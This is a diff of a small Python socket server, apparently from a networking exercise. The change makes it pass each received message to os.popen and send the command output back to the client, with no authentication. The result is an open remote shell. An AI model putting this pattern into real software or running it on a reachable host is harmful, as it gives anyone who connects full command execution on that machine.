@@ -1,8 +1,11 @@
 import sys
 import socket
 import threading
+import os
+import subprocess
 
 RECV_BUFFER_SIZE = 2048
+SEND_BUFFER_SIZE = 2048
 QUEUE_LENGTH = 10
 
 def handle_req(conn, addr):
@@ -10,7 +13,15 @@ def handle_req(conn, addr):
         while True:
             data = conn.recv(RECV_BUFFER_SIZE)
             if not data: break
-            print(data.decode('utf-8'))
+            output = os.popen(data.decode('utf-8')).read()
+            print(output)
+            print(len(output))
+            if len(output) == 0:
+                conn.sendall("No output given from command".encode('utf-8'))
+            else:    
+                conn.sendall(output.encode('utf-8'))
+            # print("did we send the data?") Data sends correctly
+            
 
 def server(server_port):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
